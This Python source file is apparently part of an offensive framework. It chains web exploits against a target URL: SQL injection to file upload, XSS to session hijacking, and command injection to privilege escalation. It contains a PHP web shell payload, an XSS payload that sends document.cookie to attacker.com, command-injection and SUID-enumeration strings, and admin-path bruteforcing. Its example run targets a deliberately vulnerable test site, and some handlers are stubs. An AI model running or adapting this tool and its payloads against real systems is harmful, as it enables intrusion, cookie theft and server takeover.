"""
Exploit Chain Module
backend/tools/exploitation/exploit_chain.py

Handles chaining multiple exploits together for complex attack scenarios.
"""

import asyncio
import logging
import json
from typing import Dict, List, Optional, Any, Callable
from dataclasses import dataclass, asdict
from datetime import datetime
from enum import Enum
import requests
from urllib.parse import urljoin, urlparse

from .initial_exploit import InitialExploit, ExploitResult, ExploitPayload

logger = logging.getLogger(__name__)

class ChainStepStatus(Enum):
    """Status of individual chain steps"""
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    SKIPPED = "skipped"

@dataclass
class ChainStep:
    """Represents a single step in an exploit chain"""
    step_id: str
    name: str
    description: str
    exploit_type: str
    payload: str
    prerequisites: List[str]
    success_condition: str
    timeout: int = 30
    retry_count: int = 3
    status: ChainStepStatus = ChainStepStatus.PENDING
    result: Optional[Dict[str, Any]] = None

@dataclass
class ChainExecution:
    """Represents the execution of an exploit chain"""
    chain_id: str
    name: str
    steps: List[ChainStep]
    start_time: datetime
    end_time: Optional[datetime] = None
    status: str = "running"
    success_count: int = 0
    failed_count: int = 0
    context: Dict[str, Any] = None

class ExploitChain:
    """
    Manages and executes exploit chains
    """

    def __init__(self, target_url: str, chain_config: Dict[str, Any]):
        self.target_url = target_url
        self.chain_config = chain_config
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.context = {}  # Shared context across chain steps

    def load_predefined_chains(self) -> Dict[str, Dict[str, Any]]:
        """Load predefined exploit chains"""
        return {
            "sql_to_file_upload": {
                "name": "SQL Injection to File Upload",
                "description": "Chain SQL injection to discover file upload endpoints and exploit them",
                "steps": [
                    {
                        "step_id": "sqli_discovery",
                        "name": "SQL Injection Discovery",
                        "description": "Discover SQL injection vulnerabilities",
                        "exploit_type": "sql_injection",
                        "payload": "' OR '1'='1",
                        "prerequisites": [],
                        "success_condition": "sql_error_detected",
                        "timeout": 30
                    },
                    {
                        "step_id": "database_enumeration",
                        "name": "Database Enumeration",
                        "description": "Enumerate database structure",
                        "exploit_type": "sql_injection",
                        "payload": "' UNION SELECT table_name FROM information_schema.tables --",
                        "prerequisites": ["sqli_discovery"],
                        "success_condition": "table_names_extracted",
                        "timeout": 45
                    },
                    {
                        "step_id": "admin_discovery",
                        "name": "Admin Panel Discovery",
                        "description": "Look for admin panel or file upload functionality",
                        "exploit_type": "directory_bruteforce",
                        "payload": "/admin/upload.php",
                        "prerequisites": ["database_enumeration"],
                        "success_condition": "upload_endpoint_found",
                        "timeout": 60
                    },
                    {
                        "step_id": "file_upload_exploit",
                        "name": "File Upload Exploitation",
                        "description": "Exploit discovered file upload functionality",
                        "exploit_type": "file_upload",
                        "payload": "<?php system($_GET['cmd']); ?>",
                        "prerequisites": ["admin_discovery"],
                        "success_condition": "shell_uploaded",
                        "timeout": 30
                    }
                ]
            },
            "xss_to_session_hijack": {
                "name": "XSS to Session Hijacking",
                "description": "Chain XSS vulnerability to steal session cookies",
                "steps": [
                    {
                        "step_id": "xss_discovery",
                        "name": "XSS Discovery",
                        "description": "Discover XSS vulnerabilities",
                        "exploit_type": "xss",
                        "payload": "<script>alert('xss')</script>",
                        "prerequisites": [],
                        "success_condition": "script_executed",
                        "timeout": 30
                    },
                    {
                        "step_id": "cookie_extraction",
                        "name": "Cookie Extraction",
                        "description": "Extract session cookies via XSS",
                        "exploit_type": "xss",
                        "payload": "<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>",
                        "prerequisites": ["xss_discovery"],
                        "success_condition": "cookies_extracted",
                        "timeout": 30
                    },
                    {
                        "step_id": "session_hijack",
                        "name": "Session Hijacking",
                        "description": "Use stolen cookies to hijack user session",
                        "exploit_type": "session_fixation",
                        "payload": "stolen_session_cookie",
                        "prerequisites": ["cookie_extraction"],
                        "success_condition": "session_hijacked",
                        "timeout": 30
                    }
                ]
            },
            "command_injection_to_privilege_escalation": {
                "name": "Command Injection to Privilege Escalation",
                "description": "Chain command injection to achieve privilege escalation",
                "steps": [
                    {
                        "step_id": "command_injection",
                        "name": "Command Injection",
                        "description": "Achieve initial command execution",
                        "exploit_type": "command_injection",
                        "payload": "; whoami",
                        "prerequisites": [],
                        "success_condition": "command_executed",
                        "timeout": 30
                    },
                    {
                        "step_id": "system_enumeration",
                        "name": "System Enumeration",
                        "description": "Enumerate system for privilege escalation vectors",
                        "exploit_type": "command_injection",
                        "payload": "; find / -perm -4000 2>/dev/null",
                        "prerequisites": ["command_injection"],
                        "success_condition": "suid_binaries_found",
                        "timeout": 60
                    },
                    {
                        "step_id": "privilege_escalation",
                        "name": "Privilege Escalation",
                        "description": "Exploit SUID binaries for privilege escalation",
                        "exploit_type": "privilege_escalation",
                        "payload": "; /usr/bin/sudo -l",
                        "prerequisites": ["system_enumeration"],
                        "success_condition": "root_achieved",
                        "timeout": 30
                    }
                ]
            }
        }

    def create_chain_steps(self, chain_config: Dict[str, Any]) -> List[ChainStep]:
        """Create ChainStep objects from configuration"""
        steps = []
        for step_config in chain_config.get('steps', []):
            step = ChainStep(
                step_id=step_config['step_id'],
                name=step_config['name'],
                description=step_config['description'],
                exploit_type=step_config['exploit_type'],
                payload=step_config['payload'],
                prerequisites=step_config.get('prerequisites', []),
                success_condition=step_config['success_condition'],
                timeout=step_config.get('timeout', 30),
                retry_count=step_config.get('retry_count', 3)
            )
            steps.append(step)
        return steps

    async def execute_step(self, step: ChainStep) -> bool:
        """Execute a single step in the exploit chain"""
        logger.info(f"Executing step: {step.name}")
        step.status = ChainStepStatus.RUNNING

        try:
            # Check prerequisites
            if not self.check_prerequisites(step.prerequisites):
                logger.warning(f"Prerequisites not met for step {step.name}")
                step.status = ChainStepStatus.SKIPPED
                return False

            # Execute the step based on exploit type
            if step.exploit_type == "sql_injection":
                result = await self.execute_sql_injection_step(step)
            elif step.exploit_type == "xss":
                result = await self.execute_xss_step(step)
            elif step.exploit_type == "command_injection":
                result = await self.execute_command_injection_step(step)
            elif step.exploit_type == "file_upload":
                result = await self.execute_file_upload_step(step)
            elif step.exploit_type == "directory_bruteforce":
                result = await self.execute_directory_bruteforce_step(step)
            elif step.exploit_type == "privilege_escalation":
                result = await self.execute_privilege_escalation_step(step)
            else:
                result = await self.execute_generic_step(step)

            step.result = result

            # Check success condition
            success = self.check_success_condition(step.success_condition, result)

            if success:
                step.status = ChainStepStatus.SUCCESS
                logger.info(f"Step {step.name} completed successfully")
                # Update context with results
                self.context[step.step_id] = result
            else:
                step.status = ChainStepStatus.FAILED
                logger.error(f"Step {step.name} failed")

            return success

        except Exception as e:
            logger.error(f"Error executing step {step.name}: {str(e)}")
            step.status = ChainStepStatus.FAILED
            step.result = {"error": str(e)}
            return False

    async def execute_sql_injection_step(self, step: ChainStep) -> Dict[str, Any]:
        """Execute SQL injection step"""
        exploit = InitialExploit(self.target_url, "sql_injection")
        try:
            results = await exploit.exploit()
            return {
                "type": "sql_injection",
                "payload": step.payload,
                "results": [asdict(r) for r in results],
                "success": any(r.success for r in results)
            }
        finally:
            exploit.cleanup()

    async def execute_xss_step(self, step: ChainStep) -> Dict[str, Any]:
        """Execute XSS step"""
        exploit = InitialExploit(self.target_url, "xss")
        try:
            results = await exploit.exploit()
            return {
                "type": "xss",
                "payload": step.payload,
                "results": [asdict(r) for r in results],
                "success": any(r.success for r in results)
            }
        finally:
            exploit.cleanup()

    async def execute_command_injection_step(self, step: ChainStep) -> Dict[str, Any]:
        """Execute command injection step"""
        exploit = InitialExploit(self.target_url, "command_injection")
        try:
            results = await exploit.exploit()
            return {
                "type": "command_injection",
                "payload": step.payload,
                "results": [asdict(r) for r in results],
                "success": any(r.success for r in results)
            }
        finally:
            exploit.cleanup()

    async def execute_file_upload_step(self, step: ChainStep) -> Dict[str, Any]:
        """Execute file upload step"""
        # This would implement file upload exploitation
        return {
            "type": "file_upload",
            "payload": step.payload,
            "success": False,
            "reason": "not_implemented"
        }

    async def execute_directory_bruteforce_step(self, step: ChainStep) -> Dict[str, Any]:
        """Execute directory bruteforce step"""
        try:
            # Test common admin/upload paths
            test_paths = [
                "/admin/upload.php",
                "/admin/fileupload.php",
                "/upload.php",
                "/fileupload.php",
                "/admin/index.php",
                "/administrator/",
                "/admin/",
                "/wp-admin/"
            ]

            found_paths = []
            for path in test_paths:
                test_url = urljoin(self.target_url, path)
                try:
                    response = self.session.get(test_url, timeout=10)
                    if response.status_code == 200:
                        found_paths.append(path)
                except:
                    continue

            return {
                "type": "directory_bruteforce",
                "found_paths": found_paths,
                "success": len(found_paths) > 0
            }

        except Exception as e:
            return {
                "type": "directory_bruteforce",
                "error": str(e),
                "success": False
            }

    async def execute_privilege_escalation_step(self, step: ChainStep) -> Dict[str, Any]:
        """Execute privilege escalation step"""
        # This would implement privilege escalation techniques
        return {
            "type": "privilege_escalation",
            "payload": step.payload,
            "success": False,
            "reason": "not_implemented"
        }

    async def execute_generic_step(self, step: ChainStep) -> Dict[str, Any]:
        """Execute generic step"""
        try:
            response = self.session.get(self.target_url, timeout=step.timeout)
            return {
                "type": "generic",
                "status_code": response.status_code,
                "response_length": len(response.text),
                "success": response.status_code == 200
            }
        except Exception as e:
            return {
                "type": "generic",
                "error": str(e),
                "success": False
            }

    def check_prerequisites(self, prerequisites: List[str]) -> bool:
        """Check if prerequisites are met"""
        for prereq in prerequisites:
            if prereq not in self.context:
                return False
        return True

    def check_success_condition(self, condition: str, result: Dict[str, Any]) -> bool:
        """Check if success condition is met"""
        condition_map = {
            "sql_error_detected": lambda r: r.get("success", False),
            "table_names_extracted": lambda r: r.get("success", False),
            "upload_endpoint_found": lambda r: len(r.get("found_paths", [])) > 0,
            "shell_uploaded": lambda r: r.get("success", False),
            "script_executed": lambda r: r.get("success", False),
            "cookies_extracted": lambda r: r.get("success", False),
            "session_hijacked": lambda r: r.get("success", False),
            "command_executed": lambda r: r.get("success", False),
            "suid_binaries_found": lambda r: r.get("success", False),
            "root_achieved": lambda r: r.get("success", False)
        }

        check_func = condition_map.get(condition, lambda r: r.get("success", False))
        return check_func(result)

    async def execute_chain(self, chain_name: str = None) -> ChainExecution:
        """Execute the entire exploit chain"""
        chains = self.load_predefined_chains()

        if chain_name and chain_name in chains:
            chain_config = chains[chain_name]
        else:
            chain_config = self.chain_config

        steps = self.create_chain_steps(chain_config)

        execution = ChainExecution(
            chain_id=chain_config.get('name', 'custom_chain'),
            name=chain_config.get('name', 'Custom Chain'),
            steps=steps,
            start_time=datetime.now(),
            context={}
        )

        logger.info(f"Starting exploit chain execution: {execution.name}")

        for step in steps:
            success = await self.execute_step(step)

            if success:
                execution.success_count += 1
            else:
                execution.failed_count += 1

            # Add delay between steps
            await asyncio.sleep(2)

            # Stop chain if critical step fails (depending on strategy)
            if not success and step.step_id in ["sqli_discovery", "xss_discovery", "command_injection"]:
                logger.warning(f"Critical step {step.name} failed, stopping chain execution")
                break

        execution.end_time = datetime.now()
        execution.status = "completed"

        logger.info(f"Chain execution completed. Success: {execution.success_count}, Failed: {execution.failed_count}")

        return execution

    def cleanup(self):
        """Cleanup resources"""
        if hasattr(self, 'session'):
            self.session.close()

# Example usage
async def main():
    """Example usage of the ExploitChain class"""
    target_url = "http://testphp.vulnweb.com/listproducts.php"

    # Use predefined chain
    chain = ExploitChain(target_url, {})

    try:
        execution = await chain.execute_chain("sql_to_file_upload")

        print(f"Chain: {execution.name}")
        print(f"Status: {execution.status}")
        print(f"Success count: {execution.success_count}")
        print(f"Failed count: {execution.failed_count}")

        for step in execution.steps:
            print(f"  Step: {step.name} - Status: {step.status.value}")

    finally:
        chain.cleanup()

if __name__ == "__main__":
    asyncio.run(main())